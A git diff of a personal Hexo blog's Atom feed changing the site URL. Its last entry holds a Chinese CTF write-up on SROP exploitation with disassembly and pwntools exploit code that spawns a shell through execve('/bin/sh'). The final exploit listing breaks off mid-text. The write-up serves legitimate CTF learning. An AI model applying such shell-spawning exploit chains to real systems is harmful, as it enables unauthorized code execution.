@@ -5,9 +5,9 @@
   
   <link href="/atom.xml" rel="self"/>
   
-  <link href="http://yoursite.com/"/>
+  <link href="http://liul14n.top/"/>
   <updated>2020-12-22T11:53:02.753Z</updated>
-  <id>http://yoursite.com/</id>
+  <id>http://liul14n.top/</id>
   
   <author>
     <name>LiuLian</name>
@@ -18,8 +18,8 @@
   
   <entry>
     <title>My First MFC Program</title>
-    <link href="http://yoursite.com/2020/12/22/My-First-MFC-Program/"/>
-    <id>http://yoursite.com/2020/12/22/My-First-MFC-Program/</id>
+    <link href="http://liul14n.top/2020/12/22/My-First-MFC-Program/"/>
+    <id>http://liul14n.top/2020/12/22/My-First-MFC-Program/</id>
     <published>2020-12-22T08:53:26.000Z</published>
     <updated>2020-12-22T11:53:02.753Z</updated>
     
@@ -31,15 +31,15 @@
     
     </summary>
     
-      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
+      <category term="开发" scheme="http://liul14n.top/categories/%E5%BC%80%E5%8F%91/"/>
     
     
   </entry>
   
   <entry>
     <title>边学习边制作自己的游戏辅助(持续更新中)</title>
-    <link href="http://yoursite.com/2020/12/20/%E8%BE%B9%E5%AD%A6%E4%B9%A0%E8%BE%B9%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
-    <id>http://yoursite.com/2020/12/20/边学习边制作自己的游戏辅助-持续更新中/</id>
+    <link href="http://liul14n.top/2020/12/20/%E8%BE%B9%E5%AD%A6%E4%B9%A0%E8%BE%B9%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
+    <id>http://liul14n.top/2020/12/20/边学习边制作自己的游戏辅助-持续更新中/</id>
     <published>2020-12-20T11:24:56.000Z</published>
     <updated>2021-01-15T15:54:32.368Z</updated>
     
@@ -51,15 +51,15 @@
     
     </summary>
     
-      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
+      <category term="开发" scheme="http://liul14n.top/categories/%E5%BC%80%E5%8F%91/"/>
     
     
   </entry>
   
   <entry>
     <title>Base64_changed(一道比赛逆向题)</title>
-    <link href="http://yoursite.com/2020/11/24/Base64-changed-%E4%B8%80%E9%81%93%E6%AF%94%E8%B5%9B%E9%80%86%E5%90%91%E9%A2%98/"/>
-    <id>http://yoursite.com/2020/11/24/Base64-changed-一道比赛逆向题/</id>
+    <link href="http://liul14n.top/2020/11/24/Base64-changed-%E4%B8%80%E9%81%93%E6%AF%94%E8%B5%9B%E9%80%86%E5%90%91%E9%A2%98/"/>
+    <id>http://liul14n.top/2020/11/24/Base64-changed-一道比赛逆向题/</id>
     <published>2020-11-24T09:08:11.000Z</published>
     <updated>2020-11-27T07:33:10.898Z</updated>
     
@@ -71,15 +71,15 @@
     
     </summary>
     
-      <category term="逆向" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91/"/>
+      <category term="逆向" scheme="http://liul14n.top/categories/%E9%80%86%E5%90%91/"/>
     
     
   </entry>
   
   <entry>
     <title>忽略细节导致耗时较多的一道逆向题Babyalgo</title>
-    <link href="http://yoursite.com/2020/11/19/%E5%BF%BD%E7%95%A5%E7%BB%86%E8%8A%82%E5%AF%BC%E8%87%B4%E8%80%97%E6%97%B6%E8%BE%83%E5%A4%9A%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98Babyalgo/"/>
-    <id>http://yoursite.com/2020/11/19/忽略细节导致耗时较多的一道逆向题Babyalgo/</id>
+    <link href="http://liul14n.top/2020/11/19/%E5%BF%BD%E7%95%A5%E7%BB%86%E8%8A%82%E5%AF%BC%E8%87%B4%E8%80%97%E6%97%B6%E8%BE%83%E5%A4%9A%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98Babyalgo/"/>
+    <id>http://liul14n.top/2020/11/19/忽略细节导致耗时较多的一道逆向题Babyalgo/</id>
     <published>2020-11-19T10:14:31.000Z</published>
     <updated>2020-11-19T11:01:56.279Z</updated>
     
@@ -91,15 +91,15 @@
     
     </summary>
     
-      <category term="逆向" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91/"/>
+      <category term="逆向" scheme="http://liul14n.top/categories/%E9%80%86%E5%90%91/"/>
     
     
   </entry>
   
   <entry>
     <title>mrctf2020_shellcode_revenge</title>
-    <link href="http://yoursite.com/2020/09/23/mrctf2020-shellcode-revenge/"/>
-    <id>http://yoursite.com/2020/09/23/mrctf2020-shellcode-revenge/</id>
+    <link href="http://liul14n.top/2020/09/23/mrctf2020-shellcode-revenge/"/>
+    <id>http://liul14n.top/2020/09/23/mrctf2020-shellcode-revenge/</id>
     <published>2020-09-23T08:43:42.000Z</published>
     <updated>2020-09-23T09:05:53.490Z</updated>
     
@@ -111,15 +111,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>xman_2019_format(堆上格式化字符串)</title>
-    <link href="http://yoursite.com/2020/09/18/xman-2019-format-%E5%A0%86%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
-    <id>http://yoursite.com/2020/09/18/xman-2019-format-堆上格式化字符串/</id>
+    <link href="http://liul14n.top/2020/09/18/xman-2019-format-%E5%A0%86%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
+    <id>http://liul14n.top/2020/09/18/xman-2019-format-堆上格式化字符串/</id>
     <published>2020-09-18T08:54:26.000Z</published>
     <updated>2020-09-18T09:42:44.782Z</updated>
     
@@ -131,15 +131,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>打造属于自己的QQ群机器人(已失效)</title>
-    <link href="http://yoursite.com/2020/07/11/%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQ%E7%BE%A4%E6%9C%BA%E5%99%A8%E4%BA%BA(%E5%B7%B2%E5%A4%B1%E6%95%88)/"/>
-    <id>http://yoursite.com/2020/07/11/打造属于自己的QQ群机器人(已失效)/</id>
+    <link href="http://liul14n.top/2020/07/11/%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQ%E7%BE%A4%E6%9C%BA%E5%99%A8%E4%BA%BA(%E5%B7%B2%E5%A4%B1%E6%95%88)/"/>
+    <id>http://liul14n.top/2020/07/11/打造属于自己的QQ群机器人(已失效)/</id>
     <published>2020-07-11T15:56:35.000Z</published>
     <updated>2020-12-22T08:52:08.977Z</updated>
     
@@ -151,15 +151,15 @@
     
     </summary>
     
-      <category term="随手小记" scheme="http://yoursite.com/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
+      <category term="随手小记" scheme="http://liul14n.top/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
     
     
   </entry>
   
   <entry>
     <title>[原创] QQ群自动签到脚本(已失效)</title>
-    <link href="http://yoursite.com/2020/07/03/%E5%8E%9F%E5%88%9B-QQ%E7%BE%A4%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E8%84%9A%E6%9C%AC/"/>
-    <id>http://yoursite.com/2020/07/03/原创-QQ群自动签到脚本/</id>
+    <link href="http://liul14n.top/2020/07/03/%E5%8E%9F%E5%88%9B-QQ%E7%BE%A4%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E8%84%9A%E6%9C%AC/"/>
+    <id>http://liul14n.top/2020/07/03/原创-QQ群自动签到脚本/</id>
     <published>2020-07-03T13:45:22.000Z</published>
     <updated>2020-12-22T08:49:08.131Z</updated>
     
@@ -171,15 +171,15 @@
     
     </summary>
     
-      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
+      <category term="开发" scheme="http://liul14n.top/categories/%E5%BC%80%E5%8F%91/"/>
     
     
   </entry>
   
   <entry>
     <title>Pwnable_orw</title>
-    <link href="http://yoursite.com/2020/05/19/Pwnable-orw/"/>
-    <id>http://yoursite.com/2020/05/19/Pwnable-orw/</id>
+    <link href="http://liul14n.top/2020/05/19/Pwnable-orw/"/>
+    <id>http://liul14n.top/2020/05/19/Pwnable-orw/</id>
     <published>2020-05-18T16:02:22.000Z</published>
     <updated>2020-05-19T15:40:45.920Z</updated>
     
@@ -191,15 +191,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>[Python]一次爬虫模拟登录的尝试</title>
-    <link href="http://yoursite.com/2020/04/02/Python-%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%9A%84%E5%B0%9D%E8%AF%95/"/>
-    <id>http://yoursite.com/2020/04/02/Python-一次爬虫模拟登录的尝试/</id>
+    <link href="http://liul14n.top/2020/04/02/Python-%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%9A%84%E5%B0%9D%E8%AF%95/"/>
+    <id>http://liul14n.top/2020/04/02/Python-一次爬虫模拟登录的尝试/</id>
     <published>2020-04-01T18:22:10.000Z</published>
     <updated>2020-12-22T08:49:31.962Z</updated>
     
@@ -211,15 +211,15 @@
     
     </summary>
     
-      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
+      <category term="开发" scheme="http://liul14n.top/categories/%E5%BC%80%E5%8F%91/"/>
     
     
   </entry>
   
   <entry>
     <title>一道有(我)意(好)思(菜)的stack题目</title>
-    <link href="http://yoursite.com/2020/03/29/%E4%B8%80%E9%81%93%E6%9C%89-%E6%88%91-%E6%84%8F-%E5%A5%BD-%E6%80%9D-%E8%8F%9C-%E7%9A%84stack%E9%A2%98%E7%9B%AE/"/>
-    <id>http://yoursite.com/2020/03/29/一道有-我-意-好-思-菜-的stack题目/</id>
+    <link href="http://liul14n.top/2020/03/29/%E4%B8%80%E9%81%93%E6%9C%89-%E6%88%91-%E6%84%8F-%E5%A5%BD-%E6%80%9D-%E8%8F%9C-%E7%9A%84stack%E9%A2%98%E7%9B%AE/"/>
+    <id>http://liul14n.top/2020/03/29/一道有-我-意-好-思-菜-的stack题目/</id>
     <published>2020-03-29T13:31:55.000Z</published>
     <updated>2020-03-29T13:52:27.064Z</updated>
     
@@ -231,15 +231,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>[BJDCTF 2nd]</title>
-    <link href="http://yoursite.com/2020/03/21/BJDCTF-2nd/"/>
-    <id>http://yoursite.com/2020/03/21/BJDCTF-2nd/</id>
+    <link href="http://liul14n.top/2020/03/21/BJDCTF-2nd/"/>
+    <id>http://liul14n.top/2020/03/21/BJDCTF-2nd/</id>
     <published>2020-03-21T08:18:42.000Z</published>
     <updated>2020-03-23T19:27:50.645Z</updated>
     
@@ -251,15 +251,15 @@
     
     </summary>
     
-      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
+      <category term="CTF" scheme="http://liul14n.top/categories/CTF/"/>
     
     
   </entry>
   
   <entry>
     <title>[Python]生成斐波那契数列的几种方式的对比与分析</title>
-    <link href="http://yoursite.com/2020/03/20/Python-%E7%94%9F%E6%88%90%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%9A%84%E5%AF%B9%E6%AF%94%E4%B8%8E%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2020/03/20/Python-生成斐波那契数列的几种方式的对比与分析/</id>
+    <link href="http://liul14n.top/2020/03/20/Python-%E7%94%9F%E6%88%90%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%9A%84%E5%AF%B9%E6%AF%94%E4%B8%8E%E5%88%86%E6%9E%90/"/>
+    <id>http://liul14n.top/2020/03/20/Python-生成斐波那契数列的几种方式的对比与分析/</id>
     <published>2020-03-20T12:54:06.000Z</published>
     <updated>2020-12-22T08:50:15.201Z</updated>
     
@@ -271,15 +271,15 @@
     
     </summary>
     
-      <category term="随手小记" scheme="http://yoursite.com/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
+      <category term="随手小记" scheme="http://liul14n.top/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
     
     
   </entry>
   
   <entry>
     <title>[Hackme.inndy]echo/echo2/echo3</title>
-    <link href="http://yoursite.com/2020/03/16/Hackme-inndy-echo-echo2-echo3/"/>
-    <id>http://yoursite.com/2020/03/16/Hackme-inndy-echo-echo2-echo3/</id>
+    <link href="http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/"/>
+    <id>http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/</id>
     <published>2020-03-16T11:11:44.000Z</published>
     <updated>2020-09-18T03:32:26.499Z</updated>
     
@@ -291,15 +291,15 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>[栈迁移]ACTF_2019_babystack</title>
-    <link href="http://yoursite.com/2020/03/14/%E6%A0%88%E8%BF%81%E7%A7%BB-ACTF-2019-babystack/"/>
-    <id>http://yoursite.com/2020/03/14/栈迁移-ACTF-2019-babystack/</id>
+    <link href="http://liul14n.top/2020/03/14/%E6%A0%88%E8%BF%81%E7%A7%BB-ACTF-2019-babystack/"/>
+    <id>http://liul14n.top/2020/03/14/栈迁移-ACTF-2019-babystack/</id>
     <published>2020-03-14T08:28:06.000Z</published>
     <updated>2020-03-28T16:58:27.131Z</updated>
     
@@ -311,19 +311,19 @@
     
     </summary>
     
-      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
+      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
     
     
   </entry>
   
   <entry>
     <title>通过三道题目学习SROP技术</title>
-    <link href="http://yoursite.com/2020/03/11/%E9%80%9A%E8%BF%87%E4%B8%89%E9%81%93%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0SROP%E6%8A%80%E6%9C%AF/"/>
-    <id>http://yoursite.com/2020/03/11/通过三道题目学习SROP技术/</id>
+    <link href="http://liul14n.top/2020/03/11/%E9%80%9A%E8%BF%87%E4%B8%89%E9%81%93%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0SROP%E6%8A%80%E6%9C%AF/"/>
+    <id>http://liul14n.top/2020/03/11/通过三道题目学习SROP技术/</id>
     <published>2020-03-11T13:55:13.000Z</published>
     <updated>2020-10-07T07:06:10.288Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/32387154_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很久之前就听大佬说过SROP了，前几天也通过SROP技术做出来一道题目，不过是看的别人WP之后才会的。</p><p>今天具体学习了一下SROP技术，先贴几个参考链接:</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_12" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">FreeBuf</a></p><blockquote><p>需要注意的是，pwntools中的SigreturnFrame中并不需要填写rt_sigreturn的地址，我们只需要确保执行rt_sigreturn的时候栈顶是SigreturnFrame就行。</p></blockquote><p>形如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,<span class="number">15</span>;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure><p>这种可以直接send(str(frame))</p><p>但形如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">syscall(<span class="number">15L</span>L, &amp;buf);</span><br></pre></td></tr></table></figure><p>这种需要send(str(frame)[8:])</p><p>前八个是调用rt_sigreturn函数的 ?</p><p>本文通过三道题目来练习这项技术，题目按照顺序来的<del>层层递进</del></p><h1 id="0x01-Ciscn-2019-s-3"><a href="#0x01-Ciscn-2019-s-3" class="headerlink" title="0x01 Ciscn_2019_s_3"></a>0x01 Ciscn_2019_s_3</h1><p>这道题目也就是我刚刚说过的通过别人的WP第一次了解SROP并用这技术做出来的题目。</p><p><strong>这道题目的特点在于</strong></p><ol><li>题目已经给了<code>mov rax,59(对应execve系统调用)</code>、<code>mov rax,15(对应sigreturn系统调用)</code></li><li>SROP能够利用到的gadgets是<code>syscall; ret</code></li></ol><p>因为之前我已经专门更过这道题的博客了，所以这里直接放链接</p><p><a href="http://liul14n.top/2020/03/07/Ciscn-2019-s-3/" target="_blank" rel="noopener">传送门</a></p><h1 id="0x02-smallest-pwn"><a href="#0x02-smallest-pwn" class="headerlink" title="0x02 smallest pwn"></a>0x02 smallest pwn</h1><p>这是CTF-WIKI上面给的一道例题。</p><p><strong>这道题目的特点是</strong></p><ol><li>程序非常小，由汇编语言写成</li><li>相比上一道题目，没有给出<code>mov rax,59</code>或者<code>mov rax,15</code></li><li>需要通过程序的read系统调用的读入字节数来设置rax的值。</li><li>SROP能够利用的gadgets是<code>syscall;ret</code></li></ol><p>这道题目有一个博主已经讲解的非常详细了，而且最后这位博主画的流程图很直观，我再写也只能是模仿，很难再超越了。这里直接给出链接了</p><p><a href="https://www.jianshu.com/p/b838a10b63c7" target="_blank" rel="noopener">简书</a></p><h1 id="0x03-rootersctf-2019-srop"><a href="#0x03-rootersctf-2019-srop" class="headerlink" title="0x03 rootersctf_2019_srop"></a>0x03 rootersctf_2019_srop</h1><p>这是BUUCTF上的一道题目</p><p><strong>这道题的特点是</strong></p><ol><li>程序非常小，由汇编语言写成</li><li>依然没有<code>mov rax,59</code>或者<code>mov rax,15</code></li><li>存在<code>pop rax</code></li><li>能够利用的gadgets是<code>pop rax;syscall;leave;ret</code>和<code>syscall;leave;ret</code>（可以注意到相比前两道题目，syscall和ret之间多了一个leave</li></ol><h2 id="0x001-分析"><a href="#0x001-分析" class="headerlink" title="0x001 分析"></a>0x001 分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>程序只开了NX保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401000 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 ; Attributes: bp-based frame</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 sub_401000      proc near               ; CODE XREF: start↓p</span><br><span class="line">.text:0000000000401000                                         ; DATA XREF: LOAD:0000000000400088↑o</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 buf             = byte ptr -80h</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000                 push    rbp</span><br><span class="line">.text:0000000000401001                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401004                 sub     rsp, 40h</span><br><span class="line">.text:0000000000401008                 mov     eax, 1</span><br><span class="line">.text:000000000040100D                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000401012                 lea     rsi, buf        ; &quot;Hey, can i get some feedback for the CT&quot;...</span><br><span class="line">.text:000000000040101A                 mov     edx, 2Ah        ; count</span><br><span class="line">.text:000000000040101F                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000401021                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401026                 lea     rsi, [rsp+40h+buf] ; buf</span><br><span class="line">.text:000000000040102B                 mov     edx, 400h       ; count</span><br><span class="line">.text:0000000000401030                 push    0</span><br><span class="line">.text:0000000000401032                 pop     rax</span><br><span class="line">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000401035                 leave</span><br><span class="line">.text:0000000000401036                 retn</span><br><span class="line">.text:0000000000401036 sub_401000      endp</span><br><span class="line">.text:0000000000401036</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037 ; Attributes: noreturn</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037                 public start</span><br><span class="line">.text:0000000000401037 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401037                 call    sub_401000</span><br><span class="line">.text:000000000040103C                 mov     eax, 3Ch</span><br><span class="line">.text:0000000000401041                 mov     edi, 0          ; error_code</span><br><span class="line">.text:0000000000401046                 syscall                 ; LINUX - sys_exit</span><br><span class="line">.text:0000000000401046 start           endp</span><br><span class="line">.text:0000000000401046</span><br><span class="line">.text:0000000000401046 _text           ends</span><br><span class="line">.text:0000000000401046</span><br></pre></td></tr></table></figure><p>程序只有两个函数，一个是调用了write和read的函数，另一个是调用exit的函数。</p><p>很明显可以看到read处存在栈溢出，可以用SROP来做。</p><h2 id="0x002-思路"><a href="#0x002-思路" class="headerlink" title="0x002 思路"></a>0x002 思路</h2><p>由于程序没有<code>/bin/sh</code>，我们需要找到一个位置写入<code>/bin/sh</code>，这个位置需要<code>可读可写</code>。</p><p>可以先通过程序自带的一次read进行栈溢出来执行一次sigreturn系统调用，使其能够向指定位置写入<code>/bin/sh</code>，然后再次进行sigreturn系统调用执行<code>execve(&#39;/bin/sh&#39;,0,0)</code></p><p>如何连续进行两次sigreturn系统调用？这里就需要构造SROP链了。<strong>例题2也是构造的SROP链</strong></p><h2 id="0x003-Let’s-do-it"><a href="#0x003-Let’s-do-it" class="headerlink" title="0x003 Let’s do it!"></a>0x003 Let’s do it!</h2><p>我们需要先找到一个位置用来写入<code>/bin/sh</code>，这个位置需要<code>可读可写</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311222501.png" alt></p><p>可以看到程序的<code>DATA区</code>权限符合我们的要求。这里选择<code>addr = 0x402100</code>吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401032                 pop     rax</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x402100</span></span><br></pre></td></tr></table></figure><p>然后通过SROP执行一次read系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#read(0,addr,300)</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">300</span> </span><br><span class="line">frame.rsp = addr<span class="comment">#注意这里！~</span></span><br><span class="line">frame.rbp = addr<span class="comment">#</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br></pre></td></tr></table></figure><p>然后向addr写入<code>/bin/sh</code>并再次进行sigreturn系统调用，执行<code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>注意第一次构造frame的时候，我们设置了frame.rsp = addr，frame.rbp = addr，这是因为由于我们的gadgets是<code>syscall;leave;ret</code>，中间有个<code>leave</code>，<code>leave</code>就相当于<code>mov rsp,rbp;pop rbp</code>，为了构造SROP链，我们需要让rsp指向我们下一个payload的地址(这个可以参考第二个例题)，但如果我们的rbp为0的话，<code>leave</code>以后rsp也为0，这显然不符合我们的要求，所以这个需要<code>让rbp=addr</code>。</p><p>但由于<code>leave</code>还有一个<code>pop rbp</code>的功能，这里构造就较为巧妙，我们addr的位置前8字节正好被写为<code>/bin/sh\x00</code>，这样当我们ret的时候，正好能将<code>p64(pop_rax_syscall_leave_ret)</code>传给rip来执行，然后进行下一次sigreturn系统调用。</p><h2 id="0x004-完整EXP"><a href="#0x004-完整EXP" class="headerlink" title="0x004 完整EXP"></a>0x004 完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 